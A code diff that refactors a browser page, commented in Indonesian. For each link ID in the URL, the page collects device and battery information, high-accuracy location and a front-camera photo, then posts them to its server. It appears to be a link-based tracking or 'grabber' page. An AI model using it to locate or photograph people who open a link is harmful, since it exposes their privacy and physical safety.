@@ -1,97 +1,102 @@
+// --- Elemen UI ---
 const startButton = document.getElementById('startButton');
-const statusDiv = document.getElementById('status');
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
+const statusList = document.getElementById('status-list');
+const videoEl = document.getElementById('video');
+const canvasEl = document.getElementById('canvas');
 
-// Ambil link_id dari URL
-const urlParams = new URLSearchParams(window.location.search);
-const linkId = urlParams.get('id');
+// --- Fungsi Bantuan ---
+const getLinkId = () => {
+    const urlParams = new URLSearchParams(window.location.search);
+    return urlParams.get('id');
+};
 
-if (!linkId) {
-    statusDiv.textContent = "Error: Link ID tidak ditemukan di URL.";
-    startButton.disabled = true;
-}
+const updateStatus = (message, isError = false) => {
+    const li = document.createElement('li');
+    li.textContent = message;
+    if (isError) {
+        li.className = 'error';
+    }
+    statusList.appendChild(li);
+    // Auto-scroll to the bottom
+    statusList.scrollTop = statusList.scrollHeight;
+};
 
-startButton.addEventListener('click', async () => {
-    startButton.disabled = true;
-    statusDiv.textContent = "Meminta izin...";
+// --- Fungsi Pengumpul Data ---
 
-    try {
-        const collectedData = {};
+const getDeviceInfo = () => {
+    updateStatus('1. Mengambil info perangkat...');
+    const data = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform || 'N/A',
+        language: navigator.language,
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+    };
 
-        // 1. Dapatkan Info Perangkat & Baterai
-        statusDiv.textContent = "Mengambil info perangkat...";
-        collectedData.deviceInfo = {
-            userAgent: navigator.userAgent,
-            platform: navigator.platform,
-            language: navigator.language,
-            screenWidth: window.screen.width,
-            screenHeight: window.screen.height,
-        };
-        if (navigator.getBattery) {
-            const battery = await navigator.getBattery();
-            collectedData.battery = {
+    if (navigator.getBattery) {
+        return navigator.getBattery().then(battery => {
+            data.battery = {
                 level: Math.round(battery.level * 100) + "%",
                 isCharging: battery.charging
             };
-        }
-
-        // 2. Dapatkan Lokasi
-        statusDiv.textContent = "Meminta izin lokasi...";
-        const location = await new Promise((resolve, reject) => {
-            navigator.geolocation.getCurrentPosition(resolve, reject, {
-                enableHighAccuracy: true
-            });
+            return data;
         });
-        collectedData.location = {
-            lat: location.coords.latitude,
-            lon: location.coords.longitude,
-            accuracy: location.coords.accuracy,
-        };
-
-        // 3. Dapatkan Foto dari Kamera Depan
-        statusDiv.textContent = "Meminta izin kamera...";
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { facingMode: 'user' } // 'user' untuk kamera depan
-        });
-        video.srcObject = stream;
-        await new Promise(resolve => video.onloadedmetadata = resolve); // Tunggu video siap
-        video.play();
-        
-        // Tunggu sebentar agar kamera bisa fokus
-        await new Promise(resolve => setTimeout(resolve, 500)); 
-
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const context = canvas.getContext('2d');
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        collectedData.photoBase64 = canvas.toDataURL('image/jpeg', 0.7); // Kualitas 70%
-        
-        // Matikan stream kamera setelah selesai
-        stream.getTracks().forEach(track => track.stop());
-        video.srcObject = null;
-
-        // 4. Kirim semua data ke server
-        statusDiv.textContent = "Mengirim data ke server...";
-        await sendDataToServer(collectedData);
-
-        statusDiv.textContent = "Data berhasil dikirim. Terima kasih! Anda bisa menutup halaman ini.";
-
-    } catch (error) {
-        console.error("Proses gagal:", error);
-        let message = "Terjadi kesalahan.";
-        if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-            message = "Anda menolak permintaan izin. Proses dibatalkan.";
-        } else if (error.name === 'NotFoundError') {
-            message = "Kamera atau perangkat lokasi tidak ditemukan.";
-        }
-        statusDiv.textContent = `Error: ${message}`;
-        startButton.disabled = false; // Izinkan coba lagi
+    } else {
+        data.battery = { level: 'N/A', isCharging: 'N/A' };
+        return Promise.resolve(data);
     }
-});
+};
 
-async function sendDataToServer(data) {
+const getLocation = () => {
+    updateStatus('2. Mengambil lokasi...');
+    if (!navigator.geolocation) {
+        throw new Error('Geolocation tidak didukung oleh browser ini.');
+    }
+    return new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(
+            position => resolve({
+                lat: position.coords.latitude,
+                lon: position.coords.longitude,
+                accuracy: position.coords.accuracy,
+            }),
+            error => reject(new Error(`Gagal mendapatkan lokasi: ${error.message}`)),
+            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+        );
+    });
+};
+
+const getPhoto = async () => {
+    updateStatus('3. Mengambil foto...');
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+        throw new Error('API Kamera (getUserMedia) tidak didukung oleh browser ini.');
+    }
+
+    const stream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: 'user' }
+    });
+    videoEl.srcObject = stream;
+    await new Promise(resolve => videoEl.onloadedmetadata = resolve);
+    videoEl.play();
+    
+    // Tunggu kamera siap
+    await new Promise(resolve => setTimeout(resolve, 500));
+
+    canvasEl.width = videoEl.videoWidth;
+    canvasEl.height = videoEl.videoHeight;
+    const context = canvasEl.getContext('2d');
+    context.drawImage(videoEl, 0, 0, canvasEl.width, canvasEl.height);
+    
+    const photoBase64 = canvasEl.toDataURL('image/jpeg', 0.7);
+    
+    // Matikan stream kamera
+    stream.getTracks().forEach(track => track.stop());
+    videoEl.srcObject = null;
+    
+    return photoBase64;
+};
+
+const sendDataToServer = async (linkId, data) => {
+    updateStatus('4. Mengirim data ke server...');
     const response = await fetch('/api/data', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -99,7 +104,49 @@ async function sendDataToServer(data) {
     });
 
     if (!response.ok) {
-        throw new Error('Gagal mengirim data ke server.');
+        const errorResult = await response.json();
+        throw new Error(`Server merespon dengan error: ${errorResult.message || response.statusText}`);
     }
     return response.json();
-}
+};
+
+
+// --- Event Listener Utama ---
+startButton.addEventListener('click', async () => {
+    startButton.disabled = true;
+    statusList.innerHTML = ''; // Bersihkan status sebelumnya
+    updateStatus('Memulai proses...');
+
+    const linkId = getLinkId();
+    if (!linkId) {
+        updateStatus('Error: Link ID tidak ditemukan di URL.', true);
+        startButton.disabled = false;
+        return;
+    }
+    
+    const allData = {};
+
+    try {
+        // Langkah 1: Info Perangkat
+        allData.deviceInfo = await getDeviceInfo();
+        updateStatus('✅ Info perangkat OK');
+        
+        // Langkah 2: Lokasi
+        allData.location = await getLocation();
+        updateStatus('✅ Lokasi OK');
+        
+        // Langkah 3: Foto
+        allData.photoBase64 = await getPhoto();
+        updateStatus('✅ Foto OK');
+        
+        // Langkah 4: Kirim
+        await sendDataToServer(linkId, allData);
+        updateStatus('✅ Semua data berhasil terkirim!');
+        updateStatus('Terima kasih! Anda bisa menutup halaman ini.');
+
+    } catch (error) {
+        console.error("Proses gagal:", error);
+        updateStatus(`❌ GAGAL: ${error.message}`, true);
+        startButton.disabled = false; // Izinkan coba lagi
+    }
+});
